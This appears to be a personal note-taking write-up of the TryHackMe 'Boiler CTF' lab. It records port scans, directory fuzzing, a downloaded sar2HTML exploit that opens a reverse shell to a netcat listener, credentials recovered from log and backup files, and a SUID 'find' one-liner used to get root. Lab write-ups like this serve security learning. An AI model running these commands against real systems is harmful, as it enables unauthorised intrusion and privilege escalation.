---
creation date: July 20th 2023
last modified date: July 20th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Boiler CTF]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt
55007/tcp open  unknown
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 21 FTP
Anon login:
```bash
ftp> ls -lsa
229 Entering Extended Passive Mode (|||41624|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
```

*.info.txt*:
```bash
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
=
```ROT13
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```


## Port 80 Apache 2.4.18
**/robots.txt**
```bash
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```
- Went to all directories and found `Not Found` for each

[[ffuf]] scan:
```ffuf
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.66.226/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 214ms]
    * FUZZ: manual

[INFO] Adding a new job to the queue: http://10.10.66.226/manual/FUZZ

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 180ms]
    * FUZZ: joomla

[INFO] Adding a new job to the queue: http://10.10.66.226/joomla/FUZZ

[Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 195ms]
    * FUZZ: 

[Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 182ms]
    * FUZZ: server-status
```

[[ffuf]] scan with /dirb/common.txt:
```bash
/_test
```

- `/_test` contained a page about *sar2html*
	- This page has an exploit that can open a reverse shell.


---

# Exploitation
## Reverse Shell for sar2HTML
- Ran exploit with:
```bash
python sar2HTMLshell.py -ip 10.10.196.156/joomla/_test -rip 10.13.0.100:9001
```
- Success we have a shell

---

# Lateral Movement to user
## Local Enumeration
### User: www-data
- `/var/www/html/joomla/_test/log.txt`
```bash
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```
- Located password for `basterd:superduperp@$$`

### User: basterd
- `/home/basterd/backup.sh`
```bash
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```




## Lateral Movement vector
- Using password found in file under www-data we gain access to another user *basterd*




---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Steps
1. Vulnerable application found at:
```bash
http://10.10.10.10/joobla/_test
```
- **sar2html**

2. Download exploit for shell:
```bash
wget https://raw.githubusercontent.com/AssassinUKG/sar2HTML/main/sar2HTMLshell.py
```

3. Start a [[rlwrap]] listener:
```bash
rlwrap -cAr nc -lvnp 9001
```

4. Run **sar2HTMLshell.py** exploit:
```bash
python sar2HTMLshell.py -ip 10.10.10.10/joomla/_test -rip 10.13.0.100:9001
```

5. Check files in local directory after shell opens and we find **log.txt** that contains a user and password:
```bash
basterd : superduperp@$$
```
- Trying on SSH and it connects us!

6. Checking files under new user **basterd** and find a file **backup.sh** that contains another user and password:
```bash
stoner : superduperp@$$no1knows
```
- Sign into new user stoner!

7. Now check **suid** for any suspicious files we notice **/usr/bin/find** checking GTFO we can exploit this for **root**:
```bash
usr/bin/find . -exec /bin/sh -p \; -quit
```

8. We are now root!

---

# Trophy & Loot

.secret / user.txt = *You made it till here, well done.*
root.txt = *It wasn't that hard, was it?*

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 20th 2023 (12:29 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
